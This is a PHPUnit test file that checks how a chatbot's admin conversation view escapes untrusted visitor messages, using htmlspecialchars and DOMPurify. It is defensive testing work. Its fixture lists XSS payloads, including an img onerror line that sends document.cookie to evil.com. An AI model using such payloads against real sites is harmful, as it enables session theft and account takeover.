<?php

/**
 * Copyright (c) 2026 Online Tech Support, LLC
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

declare(strict_types=1);

namespace Tests\Unit;

use App\Model\Message;
use PHPUnit\Framework\TestCase;

/**
 * Tests that untrusted user messages (from the public widget API) are safely
 * handled across the full pipeline: storage → rendering.
 *
 * The attack model:
 *   A visitor sends HTML/JS via the public chat widget → stored raw in DB →
 *   an admin views the conversation history → output MUST be safely escaped.
 *
 * Security layers tested:
 *   - Layer 1 (storage): Message::create preserves the raw content (no data loss)
 *   - Layer 2 (PHP render): htmlspecialchars() escapes HTML in the fallback and data-md attr
 *   - Layer 3 (JS/DOMPurify): the JS template rendered by conversation_detail.php wraps
 *     marked.parse() output with DOMPurify.sanitize() — this is tested via inclusion
 *     of the DOMPurify CDN script and code review; PHP can only verify the attribute
 *     encoding that feeds into the JS pipeline.
 */
class MessageSanitizationTest extends TestCase
{
    use \PdoMocker;

    private array $storedPayloads;

    protected function setUp(): void
    {
        \TestDb::reset();
        $this->storedPayloads = [
            // Standard XSS: inline script
            'simple_script' => '<script>alert(1)</script>',
            // XSS via event handler
            'onerror' => '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
            // XSS via javascript: URL
            'javascript_url' => '<a href="javascript:alert(1)">click me</a>',
            // XSS via onload
            'onload' => '<body onload="alert(1)">',
            // XSS via onfocus
            'onfocus' => '<input onfocus="alert(1)" autofocus>',
            // XSS via SVG
            'svg' => '<svg onload="alert(1)"></svg>',
            // XSS via iframe
            'iframe' => '<iframe src="javascript:alert(1)"></iframe>',
            // HTML entity encoded (should stay encoded)
            'entity' => '&lt;script&gt;alert(1)&lt;/script&gt;',
            // Mixed content
            'mixed' => 'Hello <b>world</b> <script>steal()</script> how are you?',
            // Plain text (control — should stay unchanged)
            'plain' => 'What is your return policy?',
            // Markdown with angle brackets
            'markdown' => 'Use the `List<int>` generic type in C#',
            // Unicode + script
            'unicode' => '日本語<script>alert(1)</script>测试',
        ];
    }

    // ── Layer 1: Storage ─────────────────────────────────────────────────

    /**
     * Test that Message::create stores the raw content as-is.
     *
     * This is the *intended* behaviour — we store raw so the LLM gets
     * the original message for processing. Sanitization happens at output time.
     */
    public function test_message_create_stores_raw_content(): void
    {
        \TestDb::setPdo($this->createMockPdo(['id' => '42']));

        foreach ($this->storedPayloads as $label => $payload) {
            \TestDb::reset();
            \TestDb::setPdo($this->createMockPdo(['id' => '42']));

            $id = Message::create(
                adminId: 1,
                chatbotId: 1,
                conversationId: 1,
                visitorSessionId: 'test-session-123',
                role: 'user',
                content: $payload,
            );

            $this->assertSame(42, $id, "Message::create failed for payload: {$label}");
        }
    }

    // ── Layer 2: Output escaping ─────────────────────────────────────────

    /**
     * Verify the exact htmlspecialchars() call used in conversation_detail.php
     * properly encodes all XSS payloads.
     *
     * The view uses:
     *   htmlspecialchars($msg['content'], ENT_QUOTES, 'UTF-8')
     * for both the `data-md` attribute and the PHP fallback text content.
     */
    public function test_htmlspecialchars_escapes_xss_payloads(): void
    {
        $evil = '<script>alert(1)</script>';
        $escaped = htmlspecialchars($evil, ENT_QUOTES, 'UTF-8');

        $this->assertStringNotContainsString('<script>', $escaped);
        $this->assertStringContainsString('&lt;script&gt;', $escaped);
    }

    /**
     * Test that htmlspecialchars with ENT_QUOTES escapes single quotes too
     * (important for the data-md attribute which is delimited by double quotes).
     */
    public function test_htmlspecialchars_escapes_single_quotes(): void
    {
        $evil = "D'Angelo's <script>alert('xss')</script>";
        $escaped = htmlspecialchars($evil, ENT_QUOTES, 'UTF-8');

        $this->assertStringContainsString('&lt;script&gt;', $escaped);
        $this->assertStringContainsString('&#039;', $escaped);
    }

    /**
     * Test that all known XSS vectors are safely entity-encoded.
     */
    public function test_all_xss_payloads_are_escaped(): void
    {
        foreach ($this->storedPayloads as $label => $payload) {
            $escaped = htmlspecialchars($payload, ENT_QUOTES, 'UTF-8');

            // Verify no raw HTML tags leak through
            $this->assertStringNotContainsString('<script', $escaped,
                "Raw <script> leaked for payload: {$label}");
            $this->assertStringNotContainsString('<img', $escaped,
                "Raw <img> leaked for payload: {$label}");
            $this->assertStringNotContainsString('<svg', $escaped,
                "Raw <svg> leaked for payload: {$label}");
            $this->assertStringNotContainsString('<iframe', $escaped,
                "Raw <iframe> leaked for payload: {$label}");
            $this->assertStringNotContainsString('<body', $escaped,
                "Raw <body> leaked for payload: {$label}");
            $this->assertStringNotContainsString('<input', $escaped,
                "Raw <input> leaked for payload: {$label}");
            $this->assertStringNotContainsString('<a href', $escaped,
                "Raw <a href> leaked for payload: {$label}");
            // onerror/onload/onfocus are just text characters — htmlspecialchars
            // encodes HTML *structure* (<, >, ", &), not attribute names.
            // The critical thing is the < and > are encoded, which breaks
            // the HTML tag so onerror can never execute as an event handler.
            // For pre-encoded input like "&lt;script&gt;" the & becomes &amp;
            // (double-encoding), so < and > may not appear as &lt; / &gt;.
            if ($payload === '&lt;script&gt;alert(1)&lt;/script&gt;') {
                $this->assertStringContainsString('&amp;lt;', $escaped,
                    "Pre-encoded input should be double-encoded for payload: {$label}");
            } elseif (str_contains($payload, '<')) {
                // Payloads with literal < should have it entity-encoded
                $this->assertStringContainsString('&lt;', $escaped,
                    "Entity encoding of < failed for payload: {$label}");
                $this->assertStringContainsString('&gt;', $escaped,
                    "Entity encoding of > failed for payload: {$label}");
            } else {
                // Plain text with no special HTML chars — returned as-is
                $this->assertSame($payload, $escaped,
                    "Plain text should pass through unchanged for payload: {$label}");
            }
        }
    }

    /**
     * Test that the data-md attribute value includes properly escaped content.
     *
     * The view template renders:
     *   data-md="<?= htmlspecialchars($msg['content'], ENT_QUOTES, 'UTF-8') ?>"
     *
     * We verify the complete HTML attribute structure is safe.
     */
    public function test_data_md_attribute_is_properly_escaped(): void
    {
        $evil = '<script>alert("xss")</script>';
        $attrValue = htmlspecialchars($evil, ENT_QUOTES, 'UTF-8');

        // Simulate the full attribute rendering
        $html = '<div class="conv-text" data-md="' . $attrValue . '">fallback</div>';

        // The attribute should NOT be breakable by the payload
        $this->assertStringContainsString('&lt;script&gt;', $html);
        $this->assertStringContainsString('&quot;', $html);

        // Verify the HTML structure is intact (no attribute breakout)
        $this->assertStringStartsWith('<div class="conv-text" data-md="', $html);
        $this->assertStringEndsWith('">fallback</div>', $html);

        // Count quotes — should be exactly 4 double quotes (2 attributes, each
        // with opening + closing). No extra quotes from unescaped content.
        $quoteCount = substr_count($html, '"');
        $this->assertSame(4, $quoteCount, "Attribute breakout detected — unexpected quote count");
    }

    /**
     * Test that nl2br(htmlspecialchars(...)) used as the PHP fallback
     * rendering is safe (no unescaped HTML).
     */
    public function test_nl2br_fallback_is_safe(): void
    {
        $evil = "Line one\n<script>alert(1)</script>\nLine three";
        $rendered = nl2br(htmlspecialchars($evil, ENT_QUOTES, 'UTF-8'));

        $this->assertStringNotContainsString('<script>', $rendered);
        $this->assertStringContainsString('&lt;script&gt;', $rendered);
        // <br /> tags from nl2br are the only allowed HTML
        $this->assertStringContainsString('<br />', $rendered);
    }

    /**
     * Test that the DOMPurify CDN script tag is present in the page scripts.
     */
    public function test_dompurify_script_is_included(): void
    {
        // Read the template to verify DOMPurify is loaded
        $viewPath = dirname(__DIR__, 2) . '/src/App/Views/chatbots/conversation_detail.php';
        $this->assertFileExists($viewPath);

        $viewContent = file_get_contents($viewPath);
        $this->assertStringContainsString(
            'dompurify',
            $viewContent,
            'DOMPurify CDN script is missing from conversation_detail.php'
        );
        $this->assertStringContainsString(
            'DOMPurify.sanitize',
            $viewContent,
            'DOMPurify.sanitize() call is missing from conversation_detail.php'
        );
    }

    /**
     * Test that the JS pipeline decodes entity-escaped text from data-md
     * but the DOMPurify wrapper ensures safe output — tested by verifying the
     * PHP-side encoding that feeds into the JS pipeline.
     */
    public function test_js_pipeline_input_is_entity_encoded(): void
    {
        // The JS does: raw = el.getAttribute('data-md') which returns the
        // HTML-entity-encoded string. Then innerHTML on a textarea decodes it.
        // We verify the attribute source is properly encoded so the decode
        // step receives the original content, not double-encoded text.

        $payload = 'Hello <script>steal()</script> world';
        $attrValue = htmlspecialchars($payload, ENT_QUOTES, 'UTF-8');

        // Simulate the JS decode step
        $ta = new \DOMDocument();
        $ta->loadHTML('<textarea>' . $attrValue . '</textarea>');
        $textareaEl = $ta->getElementsByTagName('textarea')->item(0);
        $decoded = $textareaEl->textContent; // textContent gives the decoded value

        // After decode, the original raw content is restored (ready for marked.parse)
        $this->assertSame($payload, $decoded,
            'Entity round-trip through data-md → textarea.decode should restore original');

        // Now verify DOMPurify would strip the dangerous parts
        // (This is a code-level assertion — in production, DOMPurify runs in the browser)
        $this->assertStringContainsString('<script>', $decoded,
            'Before DOMPurify: raw script tag should be present in decoded text');
        $this->assertStringNotContainsString('<script>', htmlspecialchars($decoded, ENT_QUOTES, 'UTF-8'),
            'After htmlspecialchars: script tag should be entity-encoded');
    }

    /**
     * Test that the view's PHP fallback rendering (the text between the
     * conv-text tags before JS processes it) is safe because htmlspecialchars
     * is applied in the PHP template itself.
     */
    public function test_php_render_fallback_is_escaped(): void
    {
        $evil = '<img src=x onerror="alert(1)">';
        // PHP template does: nl2br(htmlspecialchars($msg['content']))
        $rendered = nl2br(htmlspecialchars($evil, ENT_QUOTES, 'UTF-8'));

        // htmlspecialchars encodes < and >, breaking the HTML tag structure.
        // The literal text "onerror" appearing in the output is safe — it's
        // just text characters inside entity-encoded content.
        $this->assertStringNotContainsString('<img', $rendered);
        $this->assertStringContainsString('&lt;img', $rendered);
    }

    /**
     * Verify the entire view template has no unescaped echo of message content.
     */
    public function test_view_template_uses_htmlspecialchars_on_message_content(): void
    {
        $viewPath = dirname(__DIR__, 2) . '/src/App/Views/chatbots/conversation_detail.php';
        $viewContent = file_get_contents($viewPath);

        // Find all <?= echo statements — but we just need to verify the message
        // content is always wrapped in htmlspecialchars
        $lines = file($viewPath);

        $foundContentEcho = false;
        foreach ($lines as $i => $line) {
            // Look for the line that echoes msg['content']
            if (str_contains($line, "msg['content']") || str_contains($line, '$msg[\'content\']')) {
                $foundContentEcho = true;
                $this->assertStringContainsString(
                    'htmlspecialchars',
                    $line,
                    "Line " . ($i + 1) . " echoes msg['content'] without htmlspecialchars"
                );
            }
        }

        $this->assertTrue($foundContentEcho, 'Could not find any echo of msg[\'content\'] in the view');
    }
}
